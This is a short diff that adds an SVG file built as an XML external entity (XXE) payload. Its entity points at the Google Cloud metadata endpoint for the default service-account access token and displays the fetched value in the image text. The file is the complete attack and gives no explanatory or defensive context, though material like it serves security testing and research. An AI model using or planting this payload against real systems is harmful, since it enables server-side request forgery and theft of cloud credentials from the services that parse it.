@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE note [
+<!ENTITY file SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token" >
+]>
+<svg height="100" width="1000">
+  <text x="10" y="20">&file;</text>
+</svg>
